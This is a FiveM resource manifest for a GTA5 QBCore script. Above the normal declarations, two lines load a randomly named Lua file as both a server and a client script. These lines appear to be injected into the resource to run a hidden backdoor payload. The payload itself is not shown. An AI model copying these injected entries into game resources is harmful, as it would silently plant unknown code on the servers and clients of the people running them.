server_script "6DE9CJZ7O446WX.lua"
client_script "6DE9CJZ7O446WX.lua"


fx_version 'cerulean'

game 'gta5'

author 'KobenJM21'

version '1.0.0'

client_scripts{
	'client/*.lua',
}

server_scripts{
	'server/*.lua',
}

shared_script {
	'@qb-core/shared/locale.lua',
	'config.lua'
}

lua54 'yes'